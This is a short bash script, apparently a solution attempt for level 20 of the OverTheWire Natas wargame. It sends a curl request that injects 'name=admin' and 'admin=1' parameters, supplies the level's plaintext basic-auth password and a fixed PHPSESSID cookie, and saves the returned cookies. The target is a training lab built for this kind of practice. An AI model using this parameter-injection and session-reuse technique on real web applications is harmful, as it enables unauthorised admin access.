#!/usr/bin/env bash
curl http://natas20.natas.labs.overthewire.org?debug=1\&name=admin\&admin=1 \
    -u natas20:eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF \
    -b PHPSESSID=abdbqsfj0i307ngoij3ndek0i1 \
    -c cookies.txt
    #-X POST \
    #-H "Content-Type: application/x-www-form-urlencoded" \
    #-d "debug=1" -d "name=bob" \

